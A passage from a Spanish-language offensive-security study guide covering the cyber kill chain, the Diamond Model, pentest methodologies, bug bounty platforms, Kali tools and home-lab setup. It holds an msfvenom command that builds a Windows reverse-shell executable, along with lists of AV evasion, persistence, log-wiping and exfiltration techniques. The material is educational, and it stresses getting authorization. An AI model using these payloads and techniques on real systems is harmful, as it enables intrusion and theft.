**[dns](../raw/r3d3s-f0nd4m3nt0s.md#dns):**
- nslookup/dig: consultar registros (A, AAAA, MX, NS, CNAME, TXT, SOA)
- DNS Zone Transfer: si el servidor esta mal configurado (axfr)
- DNS Brute Force: subdominios comunes
- DNSDumpster: mapeo DNS
- Certificate Transparency: crt.sh revela subdominios

**Emails:**
- hunter.io: patrones de email
- haveibeenpwned.com: filtraciones
- DeHashed: buscador de filtraciones

**Activo:**
El atacante interactua con el objetivo. Puede ser detectado.

**Scanning:**
- Ping sweep: hosts vivos ([nmap](../raw/nm4p.md) -sn)
- Port scanning: puertos abiertos
  - [tcp](../raw/r3d3s-f0nd4m3nt0s.md#tcp) SYN scan (-sS): rapido, sigiloso
  - TCP Connect scan (-sT): completo, ruidoso
  - [udp](../raw/r3d3s-f0nd4m3nt0s.md#udp) scan (-sU): lento
  - FIN/NULL/Xmas: evasion de firewalls
- Service version detection: nmap -sV
- OS detection: nmap -O

**Enumeration:**
- Banner grabbing: [nc](../raw/r3v3rs3-sh3lls.md#netcat), telnet
- [smb](../raw/w1nd0ws-p0st3xpl01t.md#smb): [enum4linux](../raw/w1nd0ws-p0st3xpl01t.md#enum4linux), smbclient
- SNMP: snmpwalk, onesixtyone
- NFS: showmount -e
- Web: [gobuster](../raw/w3b-h4ck1ng.md#gobuster), [nikto](../raw/w3b-h4ck1ng.md#nikto), Wappalyzer, whatweb
- DNS: dnsrecon, sublist3r, amass

### 5.2 Weaponization

El atacante prepara el arma: exploit + [payload](../raw/m3t4spl01t.md#payloads).

**Componentes:**
- Exploit: codigo que aprovecha una [vulnerabilidad](../raw/s3c-f0nd4m3nt0s.md#vulnerabilidades)
- Payload: codigo que se ejecuta despues de la explotacion
- Backdoor: puerta trasera para acceso persistente
- Dropper: instala el payload
- Stager: descarga un payload mas grande

**Payload creation (msfvenom):**
`
msfvenom -p windows/[meterpreter](../raw/m3t4spl01t.md#meterpreter)/reverse_tcp LHOST=10.0.0.1 LPORT=4444 -f exe -o shell.exe
`
- Formatos: exe, dll, elf, py, php, asp, war, msi, vba
- Encoders: shikata_ga_nai (evasion AV)
- Payloads: meterpreter, shell_reverse_tcp, shell_bind_tcp, beacon ([cobalt strike](../raw/r3d-t34m-1nfr4.md#cobalt-strike))

**Combinacion:**
- UPX: compresion (evita firmas por bytes)
- Crypters: cifran el payload
- Binders: combinan payload con programa legitimo
- Obfuscation: codigo ofuscado

### 5.3 Delivery

El atacante entrega el arma al objetivo.

**Email:**
- [phishing](../raw/ph1sh1ng.md): emails falsos
  - [spear phishing](../raw/ph1sh1ng.md#spear-phishing): dirigido a una persona
  - Whaling: dirigido a ejecutivos
  - Clone phishing: copiar email legitimo
  - [smishing](../raw/ph1sh1ng.md#smishing): SMS, [vishing](../raw/ph1sh1ng.md#vishing): llamada
- Adjuntos: macro de Office, PDF con JS, ISO/VHD, ZIP con password
- Links: URL shortening, typosquatting, homograph attack

**Web:**
- Drive-by download: sitio comprometido descarga malware
- Malvertising: anuncios maliciosos
- Watering hole: comprometer sitio que el objetivo visita
- Fake updates: falsas actualizaciones Flash, Java, Chrome

**USB:**
- USB drop: dejar USBs infectados
- [rubber ducky](../raw/ph7s1c4l-r3d.md#rubber-ducky): USB que escribe comandos como teclado
- [badusb](../raw/ph7s1c4l-r3d.md#badusb): [firmware](../raw/u3f1-r00tk1ts.md#firmware) modificado
- USB Killer: destruye el [puerto](../raw/r3d3s-f0nd4m3nt0s.md#puertos)

**Direct Network:**
- Ataques a servicios expuestos (SSH, RDP, [vpn](../raw/4n0n1m4t0.md#vpn))
- [fuerza bruta](../raw/p4ssw0rd-4tt4cks.md#fuerza-bruta)

**Supply Chain:**
- Comprometer software antes de que llegue al usuario
- Ej: SolarWinds (2020), NotPetya, CCleaner, Codecov
- Dependency confusion: paquetes maliciosos en npm, PyPI

### 5.4 Exploitation

El atacante ejecuta el exploit y obtiene acceso inicial.

**Tipos de exploits:**
- [rce](../raw/w3b-h4ck1ng.md#rce) ([remote code execution](../raw/w3b-h4ck1ng.md#rce)): ejecutar codigo remoto
- LPE (Local [privilege escalation](../raw/l1n9x-pr1v3sc.md)): elevar privilegios
- [sql injection](../raw/w3b-h4ck1ng.md#sql-injection): consultas SQL maliciosas
- [xss](../raw/w3b-h4ck1ng.md#xss): JavaScript en el [navegador](../raw/br0ws3r-3xpl01t4t10n.md)
- [buffer overflow](../raw/pr0gr4mm1ng-f0nd4m3nt0s.md#buffer-overflow): desbordar buffer
- Use-After-Free: memoria liberada
- Race Condition: condiciones de carrera

**Initial Access:**
- Shell en un servidor web
- Acceso a correo electronico
- Usuario creado en el sistema
- Session RDP/VNC

### 5.5 Installation

Una vez con acceso, mantenerlo ([persistencia](../raw/w1nd0ws-p0st3xpl01t.md#persistencia)) y evitar deteccion.

**Windows persistence:**
- Registry Run Keys: HKCU\...\Run
- Scheduled Tasks: tareas programadas
- Services: instalar como servicio
- Startup Folder
- [wmi](../raw/w1n-s9bsyst3ms.md#wmi) Event Subscription
- DLL Hijacking
- COM Hijacking
- [bootkit](../raw/u3f1-r00tk1ts.md#bootkits): modifica MBR/[uefi](../raw/u3f1-r00tk1ts.md)

**Linux persistence:**
- [cron](../raw/l1n9x-pr1v3sc.md#cron-jobs) jobs
- SSH authorized_keys
- /etc/rc.local
- [systemd](../raw/l1n9x-4dm1n.md#systemd) services
- .bashrc, .profile
- LD_PRELOAD
- [kernel](../raw/0s-f0nd4m3nt0s.md#kernel) modules (LKM rootkit)
- Web shell (PHP/ASP/JSP)
- Setuid binaries

**Defense Evasion:**
- [process injection](../raw/3dr-3v4s10n.md#process-injection): CreateRemoteThread, Process Hollowing, APC Injection, [dll injection](../raw/3dr-3v4s10n.md#dll-injection)
- Rootkits: user-mode, kernel-mode, bootkit
- Timestomping: modificar timestamps
- Killing AV: detener antivirus
- Obfuscated files: codigo ofuscado
- Living off the Land (LotL): [powerShell](../raw/w1nd0ws-p0st3xpl01t.md#powershell), WMI, PsExec, certutil
- [amsi bypass](../raw/3dr-3v4s10n.md#amsi-bypass), [etw](../raw/3dr-3v4s10n.md#etw) bypass
- Disable logging: borrar logs
- Masquerading: renombrar archivos

### 5.6 [c2](../raw/r3v3rs3-sh3lls.md#command-and-control) (Command & Control)

C2 es el canal de comunicacion entre el atacante y el sistema comprometido.

**C2 Topologies:**
- Direct C2: conexion directa al atacante (facil de bloquear)
- Indirect (Redirectors): nginx, CDN (CloudFront)
- P2P C2: [red](../raw/r3d3s-f0nd4m3nt0s.md) peer-to-peer sin servidor central

**[domain fronting](../raw/r3d-t34m-1nfr4.md#domain-fronting):**
- Usar CDNs para esconder el destino real
- SNI muestra el CDN, Host header muestra el C2 real
- Mayormente mitigado hoy

**Protocolos de C2:**
- [http](../raw/r3d3s-f0nd4m3nt0s.md#http)/[https](../raw/r3d3s-f0nd4m3nt0s.md#https): el mas comun, se mezcla con trafico web
- DNS: datos en subdominios (dnscat2, iodine)
- ICMP: datos en paquetes ping (Hans, Ping Tunnel)
- HTTP sobre puertos no estandar (53, 443 aunque no sea HTTPS)

**Beaconing:**
- Latidos periodicos al C2
- Intervalos: segundos (facil de detectar) a horas (sigiloso)
- Jitter: variacion aleatoria para evitar patrones

**C2 Frameworks:**
- Cobalt Strike: el mas usado (pentesting y criminales)
- [metasploit](../raw/m3t4spl01t.md)
- [empire](../raw/r3v3rs3-sh3lls.md#empire) (PowerShell/[python](../raw/pyth0n-f0r-h4ck1ng.md))
- [covenant](../raw/r3v3rs3-sh3lls.md#covenant) (C#)
- Sliver (open source)
- Havoc
- Mythic (multi-lenguaje)
- Brute Ratel C4

### 5.7 Actions on Objectives

El atacante logra su objetivo final.

**Data Exfiltration:**
- Subir a [cloud](../raw/cl0ud-h4ck1ng.md) (Google Drive, Dropbox, Mega)
- Enviar por email
- FTP/SCP a servidor externo
- DNS queries
- USB [fisico](../raw/ph7s1c4l-r3d.md)
- Esteganografia en imagenes
- Archivos comprimidos con password

**Lateral Movement:**
- pass-the-[hash](../raw/w1nd0ws-p0st3xpl01t.md#pass-the-hash): usar [hash](../raw/crypt0-f0r-h4ck3rs.md#hash-functions) NTLM como password
- [pass-the-ticket](../raw/w1nd0ws-p0st3xpl01t.md#pass-the-ticket): robar tickets Kerberos
- Overpass-the-Hash: hash NTLM a ticket Kerberos
- RDP, PsExec, WMI, SCHTASKS
- SMB admin shares (admin$, C$)
- SSH, WinRM

**Privilege Escalation (Linux):**
- Kernel exploits: DirtyCow, PwnKit
- [suid](../raw/l1n9x-pr1v3sc.md#suid) binaries
- [sudo](../raw/l1n9x-pr1v3sc.md#sudo) mal configurado
- Cron jobs modificables
- PATH hijacking
- NFS sin root_squash
- [docker](../raw/d0ck3r-f0r-h4ck3rs.md) (grupo [docker](../raw/d0ck3r-f0r-h4ck3rs.md))

**Privilege Escalation (Windows):**
- Token manipulation
- Service permissions
- Unquoted service paths
- AlwaysInstallElevated
- [uac bypass](../raw/w1n-byp4ss3s.md#uac-bypass)
- DLL hijacking
- Kernel exploits: PrintNightmare
- Potato attacks (Juicy, Sweet)
- [gpo](../raw/w1nd0ws-d0m41n-4dm1n.md#group-policy) abuse

**Covering Tracks:**
- Borrar logs (Event Log, syslog)
- Borrar bash history
- Timestomping
- Deshabilitar logging
- Borrar archivos temporales
- Limpiar comandos de la sesion

### 5.8 Cyber Kill Chain vs Unified Kill Chain

**Cyber Kill Chain (Lockheed Martin):**
1. Reconnaissance
2. Weaponization
3. Delivery
4. Exploitation
5. Installation
6. Command & Control (C2)
7. Actions on Objectives

**Limitaciones:**
- Lineal: los ataques no siempre son lineales
- No cubre bien insider threats
- No cubre bien ataques con credenciales robadas
- Se enfoca en malware

**Unified Kill Chain:**
18 fases en 3 ciclos:

**Ciclo 1: In (Entrar)**
1. Reconnaissance
2. Weaponization
3. [social engineering](../raw/ph1sh1ng.md#ingenieria-social)
4. Exploitation
5. Persistence
6. Defense Evasion
7. Command & Control

**Ciclo 2: Through (A traves de)**
8. [pivoting](../raw/l1n9x-pr1v3sc.md#pivoting)
9. Discovery
10. Privilege Escalation
11. Execution
12. Credential Access
13. Lateral Movement

**Ciclo 3: Out (Salir)**
14. Collection
15. Exfiltration
16. Impact
17. Objectives
18. Covering Tracks

### 5.9 Diamond Model

Marco para analizar ataques con 4 vertices:

`
          Adversary
             /\
            /  \
Infrastructure ---- Victim
            \  /
             \/
          Capability
`

**Adversary:** quien esta detras del ataque (individuo, APT, estado)
**Victim:** quien es atacado (persona, organizacion, sector)
**Capability:** herramientas y tecnicas usadas (malware, exploits)
**Infrastructure:** recursos usados (C2, dominios, [ips](../raw/s3c-f0nd4m3nt0s.md#ids-ips), VPS)
  - Tipo 1: controlada directamente por el adversario
  - Tipo 2: intermediario (servidor comprometido)
  - Tipo 3: servicios publicos (CDN, cloud, [redes](../raw/r3d3s-f0nd4m3nt0s.md) sociales)

---

<a name=\"metodologias-de-seguridad\"></a>
## 6. Metodologias de Seguridad

### 6.1 [ptes](../raw/p3nt3st-m3th0d0l0gy.md#ptes) (Penetration Testing Execution Standard)

PTES define las 7 fases de un pentest profesional.

**1. Pre-Engagement:**
- Definir alcance: sistemas, tipos de prueba, horarios
- Firmar NDA
- Obtener [autorizacion](../raw/s3c-f0nd4m3nt0s.md#autorizacion) por escrito (Get Out of Jail Free card)
- Reglas de engagement
- Establecer canales de comunicacion
- Definir objetivos y estimar duracion/costo

**2. Intelligence Gathering:**
- [osint](../raw/0s1nt.md) pasivo
- Escaneo activo
- Footprinting de infraestructura
- Identificar tecnologias, versiones, parches
- Buscar filtraciones
- Mapear la [red](../raw/r3d3s-f0nd4m3nt0s.md)

**3. Threat Modeling:**
- Identificar activos criticos
- Identificar vectores de ataque
- Priorizar riesgos
- Diagramas de flujo de datos
- Analisis de superficie de ataque

**4. Vulnerability Analysis:**
- Escaneo automatico (Nessus, OpenVAS, Qualys)
- Verificacion manual de falsos positivos
- Pruebas de configuracion
- Pruebas de parches

**5. Exploitation:**
- Intentar explotar vulnerabilidades
- Validar que son explotables
- Obtener acceso inicial
- Documentar resultados

**6. Post-Exploitation:**
- [persistencia](../raw/w1nd0ws-p0st3xpl01t.md#persistencia) (si esta en alcance)
- Escalar privilegios
- Movimiento lateral
- Recolectar datos sensibles (PoC)
- Documentar impacto potencial

**7. Reporting:**
- Resumen ejecutivo (sin tecnicismos)
- Reporte tecnico detallado
- Vulnerabilidades con CVSS
- Pasos de reproduccion (PoC)
- Recomendaciones de mitigacion
- Evidencia (screenshots, logs)
- Plan de remediacion

### 6.2 [osstmm](../raw/p3nt3st-m3th0d0l0gy.md#osstmm) (Open Source Security Testing Methodology Manual)

Metodologia de ISECOM. Divide las pruebas en 5 canales:

**1. Human Security:**
- [ingenieria social](../raw/ph1sh1ng.md#ingenieria-social)
- [phishing](../raw/ph1sh1ng.md), pretexting, tailgating
- Concientizacion del personal

**2. [physical security](../raw/ph7s1c4l-r3d.md):**
- Control de acceso [fisico](../raw/ph7s1c4l-r3d.md)
- Cerraduras, alarmas, camaras
- Perimetros
- Dumpster diving

**3. Wireless Security:**
- [wifi](../raw/w1f1-4tt4cks.md) ([wpa2](../raw/w1f1-4tt4cks.md#wpa2), WPA3, WEP)
- Bluetooth, BLE
- [rfid](../raw/ph7s1c4l-r3d.md#rfid), NFC
- Zigbee, Z-Wave (IoT)

**4. Telecom Security:**
- VoIP (SIP, RTP)
- PBX, centrales telefonicas
- Modems, fax
- [vishing](../raw/ph1sh1ng.md#vishing), wardialing

**5. Data Networks Security:**
- [redes](../raw/r3d3s-f0nd4m3nt0s.md) cableadas (Ethernet, VLANs)
- Protocolos ([tcp/ip](../raw/r3d3s-f0nd4m3nt0s.md#tcp-ip), [dns](../raw/r3d3s-f0nd4m3nt0s.md#dns), [dhcp](../raw/r3d3s-f0nd4m3nt0s.md#dhcp))
- Firewalls, routers, switches
- VPNs

**RAV (Risk Assessment Values):**
- RAV = Controles implementados / Controles posibles
- Rango: 0 (sin seguridad) a 100 (perfecto)

### 6.3 [owasp](../raw/w3b-h4ck1ng.md#owasp-top-10) Testing Guide

Guia para pentesting de aplicaciones web. 12 controles, 91 tests.

**12 Controles:**
1. Information Gathering
2. Configuration and Deployment Management Testing
3. Identity Management Testing
4. Authentication Testing
5. Authorization Testing
6. Session Management Testing
7. [input validation](../raw/s3c-f0nd4m3nt0s.md#validacion-de-entrada) Testing ([xss](../raw/w3b-h4ck1ng.md#xss), [sqli](../raw/w3b-h4ck1ng.md#sql-injection), etc.)
8. Error Handling Testing
9. [cryptography](../raw/crypt0-f0r-h4ck3rs.md) Testing
10. Business Logic Testing
11. Client-side Testing
12. API Testing

Cada test tiene: objetivo, como realizarlo, herramientas, remediation.

### 6.4 [nist](../raw/p3nt3st-m3th0d0l0gy.md#nist) SP 800-115

Guia del NIST para pruebas de seguridad.

**Fases:**
- Planning: objetivos, sistemas, reglas, herramientas, autorizacion
- Execution:
  - Discovery: descubrir sistemas
  - Vulnerability scanning: identificar vulnerabilidades
  - Penetration testing: explotar
  - Validation: confirmar hallazgos
- Post-Execution: analisis, reportes, recomendaciones

**Categorias:**
- Review Techniques: revision de documentos y configuraciones
- Target Identification: escaneo, fingerprinting, enumeracion
- Target Vulnerability Validation: explotacion, verificacion

### 6.5 [red team](../raw/r3d-t34m-1nfr4.md) vs Blue Team vs [purple team](../raw/p9rpl3-t34m.md)

**Red Team:**
- Simula atacantes reales
- Objetivo: evaluar deteccion y respuesta
- Sin restricciones (dentro del alcance)
- Tecnicas reales de ataque
- Incluye ingenieria social, ataques fisicos
- A menudo opera sin aviso al Blue Team

**Blue Team:**
- Defensores: monitorean, detectan, responden
- Operan SOC (Security Operations Center)
- Gestionan SIEM, EDR, firewalls
- Analisis de logs e investigacion de alertas
- Respuesta a incidentes

**Purple Team:**
- Colaboracion entre Red y Blue Team
- Red Team comparte TTPs, Blue Team ajusta detecciones
- Objetivo: mejorar defensas usando tecnicas ofensivas
- Ejercicios en vivo de mejora continua

### 6.6 [bug bounty](../raw/b9g-b09nty.md)

**Plataformas:**

**[hackerone](../raw/b9g-b09nty.md#hackerone):**
- La mas grande
- Programas: Google, Microsoft, Uber, Spotify
- Sistema de reputacion (Signal vs Reputation)
- Hacktivity: feed publico

**[bugcrowd](../raw/b9g-b09nty.md#bugcrowd):**
- Programas: Facebook, Tesla, Atlassian
- Hackers clasificados por nivel (1-5)
- VRT (Vulnerability Rating Taxonomy)

**Synack:**
- Solo por invitacion
- Hackers verificados (Synack Red Team)
- Pagos mas altos

**Intigriti:**
- Europea
- Conferencia 1337UP

**Conceptos:**
- Scope: sistemas permitidos
- Out of scope: sistemas prohibidos
- Disclosure: publicacion del reporte tras parche
- Triage: evaluacion de validez
- Duplicate: ya reportado, sin recompensa
- Bounty: recompensa economica
- VDP: programa sin recompensa, solo [reconocimiento](../raw/0s1nt.md#reconocimiento)
- Hall of Fame: reconocimiento publico

---

<a name=""herramientas-esenciales""></a>
## 7. Herramientas Esenciales

### 7.1 Virtualizacion

**VirtualBox (Oracle):**
- Gratuito, open source
- Host: Windows, Linux, macOS
- Features: snapshots, shared folders, virtual networking
- Formatos: .vdi, .vmdk, .vhd
- Ideal para laboratorio de hacking

**VMWare:**
- Workstation Pro (paga), Workstation Player (gratis limitada)
- Fusion (macOS)
- Mejor rendimiento que VirtualBox (I/O y GPU)
- Features: snapshots, clones, [redes](../raw/r3d3s-f0nd4m3nt0s.md) personalizadas
- vSphere/ESXi: hipervisor de datacenter

**Vagrant (HashiCorp):**
- VMs como infraestructura como codigo
- Vagrantfile: define la configuracion
- Boxes: imagenes base (Vagrant [cloud](../raw/cl0ud-h4ck1ng.md))
- Comandos: vagrant init, up, ssh, destroy
- Provisioners: shell, Ansible, Puppet, Chef

**[docker](../raw/d0ck3r-f0r-h4ck3rs.md):**
- Contenedores: comparten [kernel](../raw/0s-f0nd4m3nt0s.md#kernel) del host
- Mas ligeros que VMs
- Entornos vulnerables en Docker:
  `
  docker pull vulnerables/web-dvwa
  docker run --rm -it -p 80:80 vulnerables/web-dvwa
  `
- Dockerfile, docker-compose.yml
- Redes: bridge, host, overlay, macvlan
- NO son tan aislados como VMs (comparten kernel)

**WSL (Windows Subsystem for Linux):**
- Linux integrado en Windows
- WSL1: traduccion de llamadas al sistema
- WSL2: kernel Linux real en Hyper-V ligero
- Ideal para herramientas CLI

### 7.2 Distribuciones de Seguridad

**Kali Linux (Offensive Security):**
- La mas famosa para pentesting
- Basada en Debian Testing
- 600+ herramientas preinstaladas
- Desktop: Xfce
- Kali NetHunter: para [android](../raw/4db-d33p-d1v3.md)
- Kali Purple: version defensiva
- No recomendada como SO principal

**Parrot OS:**
- Basada en Debian Testing
- Orientada a privacidad y desarrollo
- Desktop: MATE
- Mas estable que Kali para uso diario
- Incluye [tor](../raw/4n0n1m4t0.md#tor) y Firefox preconfigurado

**REMnux:**
- Para analisis de malware (reversing)
- Descompiladores, debuggers, analisis de memoria

**Windows 10/11 VM:**
- Necesaria para pentesting Windows
- Tools: Sysinternals Suite, Process Monitor
- Windows Server: para [active directory](../raw/w1nd0ws-d0m41n-4dm1n.md)

**Metasploitable:**
- Metasploitable 2: Linux intencionalmente vulnerable
- Metasploitable 3: Windows + Linux (requiere Packer)

**DVWA (Damn Vulnerable Web Application):**
- App web PHP/MySQL vulnerable
- Niveles: Low, Medium, High, Impossible
- Vulnerabilidades: [sqli](../raw/w3b-h4ck1ng.md#sql-injection), [xss](../raw/w3b-h4ck1ng.md#xss), [csrf](../raw/w3b-h4ck1ng.md#csrf), [file upload](../raw/w3b-h4ck1ng.md#file-upload), etc.

**VulnHub:**
- VMs vulnerables para practicar
- Desde beginner hasta advanced
- Ejemplos: Kioptrix, Mr-Robot, DC-Series

**Hack The Box ([htb](../raw/ctf-h4ckth3b0x.md#hackthebox)):**
- Plataforma online de hacking
- [vpn](../raw/4n0n1m4t0.md#vpn) + maquinas para hackear
- Active vs Retired (writeups publicos)
- VIP: maquinas retiradas, PwnBox
- Pro Labs: entornos corporativos
- HTB Academy: cursos interactivos

**[tryhackme](../raw/ctf-h4ckth3b0x.md#tryhackme)-h4ckth3b0x.md#[tryhackme](../raw/ctf-h4ckth3b0x.md#tryhackme)) (THM):**
- Mas educativa que HTB
- Rooms: laboratorios guiados
- Paths: rutas de aprendizaje
- Ideal para principiantes
- AttackBox: VM en el [navegador](../raw/br0ws3r-3xpl01t4t10n.md)

### 7.3 Kali Linux - Herramientas por Categoria

**Information Gathering:**
- [nmap](../raw/nm4p.md): [escaneo de puertos](../raw/nm4p.md#escaneo-de-puertos) y servicios
- masscan: escaneo masivo (internet entero)
- [netcat](../raw/r3v3rs3-sh3lls.md#netcat): navaja suiza de redes
- dnsrecon, dnsenum: enumeracion [dns](../raw/r3d3s-f0nd4m3nt0s.md#dns)
- theHarvester: [osint](../raw/0s1nt.md) (emails, subdominios)
- spiderfoot: OSINT automation
- [recon](../raw/0s1nt.md#reconocimiento)-ng: framework OSINT
- whatweb/wappalyzer: tecnologias web
- wafw00f: identificar WAF

**Vulnerability Analysis:**
- nessus: scanner comercial
- openvas/greenbone: scanner open source
- [nikto](../raw/w3b-h4ck1ng.md#nikto): scanner web
- legion: scanner automatico (GUI)
- [sqlmap](../raw/w3b-h4ck1ng.md#sqlmap): [sql injection](../raw/w3b-h4ck1ng.md#sql-injection) automation

**Web Application Analysis:**
- burpsuite: [proxy](../raw/r3d3s-f0nd4m3nt0s.md#proxy) de interceptacion (Community gratuita)
- zaproxy ([owasp](../raw/w3b-h4ck1ng.md#owasp-top-10) ZAP): proxy de seguridad
- [gobuster](../raw/w3b-h4ck1ng.md#gobuster)/[dirb](../raw/w3b-h4ck1ng.md#dirbusting)/dirbuster: [fuzzing](../raw/fuzz1ng.md) de directorios
- wfuzz: fuzzing web flexible
- [hydra](../raw/p4ssw0rd-4tt4cks.md#hydra): [fuerza bruta](../raw/p4ssw0rd-4tt4cks.md#fuerza-bruta) a servicios web
- cadaver: cliente WebDAV
- commix: [command injection](../raw/w3b-h4ck1ng.md#command-injection) automation

**Database Assessment:**
- sqlmap: SQL injection
- sqlninja: SQL Server exploitation
- jsql: GUI para SQL injection

**Password Attacks:**
- [hashcat](../raw/p4ssw0rd-4tt4cks.md#hashcat): [cracking](../raw/p4ssw0rd-4tt4cks.md#cracking-de-contrasenas) con GPU
- [john the ripper](../raw/p4ssw0rd-4tt4cks.md#john-the-ripper): cracking de hashes
- hydra: fuerza bruta online
- medusa: fuerza bruta en paralelo
- crunch: generador de wordlists
- cewl: wordlists desde sitios web
- rsmangler: variaciones de palabras

**Wireless Attacks:**
- [aircrack-ng](../raw/w1f1-4tt4cks.md#aircrack-ng): cracking WEP/WPA/[wpa2](../raw/w1f1-4tt4cks.md#wpa2)
- airgeddon: auditoria [wifi](../raw/w1f1-4tt4cks.md) todo-en-uno
- [reaver](../raw/w1f1-4tt4cks.md#reaver): ataque [wps](../raw/w1f1-4tt4cks.md#wps) PIN
- kismet: detector de redes
- [bettercap](../raw/m1tm-m0b1l3.md#bettercap): [mitm](../raw/m1tm-m0b1l3.md) framework

**Reverse Engineering:**
- [ghidra](../raw/4pk-r3v3rs1ng.md#ghidra): RE framework (NSA)
- radare2/iaito: RE framework
- ollydbg: debugger 32-bit
- x64dbg: debugger 64-bit
- IDA Free: disassembler
- strings: extraer cadenas de binarios

**Exploitation Tools:**
- [metasploit](../raw/m3t4spl01t.md) framework: el framework de [exploit](../raw/m3t4spl01t.md#exploits) mas completo
- searchsploit: buscar exploits en Exploit-DB
- msfvenom: generacion de payloads
- BeEF: [browser exploitation](../raw/br0ws3r-3xpl01t4t10n.md) Framework
- [social engineering toolkit](../raw/ph1sh1ng.md#social-engineering-toolkit) ([set](../raw/ph1sh1ng.md#social-engineering-toolkit))

**Sniffing & Spoofing:**
- [wireshark](../raw/r3d3s-f0nd4m3nt0s.md#wireshark): analizador de paquetes (GUI)
- [tcpdump](../raw/r3d3s-f0nd4m3nt0s.md#tcpdump): [captura de paquetes](../raw/r3d3s-f0nd4m3nt0s.md#captura-de-paquetes) (CLI)
- bettercap: MITM framework
- ettercap: MITM suite
- [responder](../raw/w1nd0ws-p0st3xpl01t.md#responder): [llmnr](../raw/w1nd0ws-p0st3xpl01t.md#llmnr-nbt-ns)/[nbt-ns](../raw/w1nd0ws-p0st3xpl01t.md#llmnr-nbt-ns) poisoning

**Post Exploitation:**
- [mimikatz](../raw/p4ssw0rd-4tt4cks.md#mimikatz): dumpear credenciales de Windows
- [powerShell](../raw/w1nd0ws-p0st3xpl01t.md#powershell) [empire](../raw/r3v3rs3-sh3lls.md#empire): post-ex plotation framework
- [bloodhound](../raw/w1nd0ws-p0st3xpl01t.md#bloodhound): mapeo de Active Directory
- impacket: toolkit de protocolos de Windows
- [chisel](../raw/l1n9x-pr1v3sc.md#chisel): tunneling
- [ligolo](../raw/l1n9x-pr1v3sc.md#ligolo-ng)-ng: tunneling reverso

**Forensics:**
- autopsy/sleuth kit: analisis [forense](../raw/w1n-f0r3ns1cs.md#forense)
- volatility: analisis de memoria RAM
- binwalk: analisis de [firmware](../raw/u3f1-r00tk1ts.md#firmware)
- foremost: recuperacion de archivos

**Reporting:**
- dradis: plataforma de reporting colaborativo
- faraday: IDE de pentesting
- cherrytree: notas jerarquicas
- keepnote: toma de notas

### 7.4 Proxy y Herramientas de Intercepcion

**[burp suite](../raw/w3b-h4ck1ng.md#burp-suite):**
- Proxy de interceptacion web
- Community Edition: gratuita (limitada)
- Professional: paga (funcionalidades completas)
- Features: Proxy, Repeater, Intruder, Decoder, Scanner (Pro)
- Extensiones: BApp Store

**OWASP ZAP:**
- Alternativa gratuita y open source a Burp
- Features: proxy, scanner automatico, [fuzzer](../raw/fuzz1ng.md#fuzzer)
- Ideal si no tenes presupuesto para Burp Pro

**mitmproxy:**
- Proxy de linea de comandos
- Scripteable con [python](../raw/pyth0n-f0r-h4ck1ng.md)
- Ideal para automatizacion

### 7.5 Navegacion Segura

**Tor Browser:**
- Basado en Firefox
- Enruta trafico a traves de la [red](../raw/r3d3s-f0nd4m3nt0s.md) Tor (3 nodos)
- Oculta tu [ip](../raw/r3d3s-f0nd4m3nt0s.md#direccionamiento-ip) y ubicacion
- No es 100% anonimo (vulnerabilidades de browser, exit nodes)
- .onion: sitios ocultos (dark web)

**Firefox Hardening:**
- Deshabilitar WebRTC (filtra IP real)
- Deshabilitar telemetria
- uBlock Origin: bloqueador de anuncios
- NoScript: bloquear JavaScript por sitio
- Privacy Badger: anti-tracking
- Configurar about:config para privacidad

**Privacy Extensions:**
- uBlock Origin: bloqueo de anuncios y rastreadores
- NoScript: control de JavaScript
- Privacy Badger (EFF): anti fingerprinting
- Decentraleyes: CDN local
- Cookie AutoDelete: limpiar cookies

### 7.6 Terminal y Productividad

**tmux:**
- Terminal multiplexer
- Split panes: Ctrl+b % (vertical), Ctrl+b \"" (horizontal)
- Sessions: tmux new -s nombre, tmux attach -t nombre
- Scrollback: Ctrl+b  (modo scroll)
- Windows: Ctrl+b c (crear), Ctrl+b p/n (anterior/siguiente)

**screen:**
- Similar a tmux pero mas antiguo
- Crear sesion: screen -S nombre
- Desconectar: Ctrl+a d
- Reconectar: screen -r nombre

**Oh My Zsh:**
- Framework para Zsh
- Temas: agnoster, powerlevel10k, robbyrussell
- Plugins: git, docker, kubectl, [[sudo](../raw/l1n9x-pr1v3sc.md#sudo), autojump, zsh-autosuggestions

**Aliases utiles:**
- ll = ls -lah
- la = ls -A
- l = ls -CF
- grep = grep --color=auto
- ports = netstat -tulanp

### 7.7 Vim Basico

**Modos de Vim:**
- Normal: modo por defecto (navegacion)
- Insert: modo de escritura (i, a, o)
- Visual: modo de seleccion (v, V, Ctrl+v)
- Command: modo de comandos (:)

**Navegacion:**
- h, j, k, l: izquierda, abajo, arriba, derecha
- w, b: siguiente/anterior palabra
- 0, fin: inicio/fin de linea (dolar)
- gg, G: inicio/fin del archivo
- Ctrl+d, Ctrl+u: media pagina abajo/arriba

**Insercion:**
- i: insertar antes del cursor
- a: insertar despues del cursor
- o: nueva linea debajo
- O: nueva linea arriba

**Busqueda y Reemplazo:**
- /patron: buscar hacia adelante
- ?patron: buscar hacia atras
- n, N: siguiente/anterior resultado
- :%s/old/new/g: reemplazar todo
- :%s/old/new/gc: reemplazar con confirmacion

**Comandos utiles:**
- :w: guardar
- :q: salir
- :wq: guardar y salir
- :q!: salir sin guardar
- dd: borrar linea
- yy: copiar linea
- p, P: pegar debajo/arriba
- u: deshacer
- Ctrl+r: rehacer
- .: repetir ultimo comando
---

<a name=""laboratorio-de-practica""></a>
## 8. Laboratorio de Practica

### 8.1 Setting Up a Home Lab

Un laboratorio casero es esencial para practicar hacking de forma segura y legal. Nunca practiques en sistemas que no te pertenecen o sin [autorizacion](../raw/s3c-f0nd4m3nt0s.md#autorizacion).

**Componentes basicos:**

**Host Machine (tu PC):**
- Windows, Linux o macOS
- 16GB+ RAM recomendado (32GB ideal)
- 256GB+ disco libre
- CPU con virtualizacion (VT-x/AMD-V) habilitada en BIOS
- VirtualBox o VMWare instalado

**Kali Linux VM:**
- Tu maquina de ataque
- 4GB RAM, 40GB disco
- Adaptador de [red](../raw/r3d3s-f0nd4m3nt0s.md): [nat](../raw/r3d3s-f0nd4m3nt0s.md#nat) para internet, Host-only para laboratorio
- Instalacion: descargar ISO de kali.org, crear VM, instalar

**Windows 10/11 VM:**
- Maquina victima (o para practicar post-explotacion)
- 4GB RAM, 60GB disco
- Deshabilitar Windows Defender (para practicar exploits)
- Windows Developer VMs (gratis por 90 dias): developer.microsoft.[com](../raw/w1n-s9bsyst3ms.md#com)

**Vulnerable VMs:**

**Metasploitable 2:**
- Descargar de SourceForge
- Importar en VirtualBox/VMWare
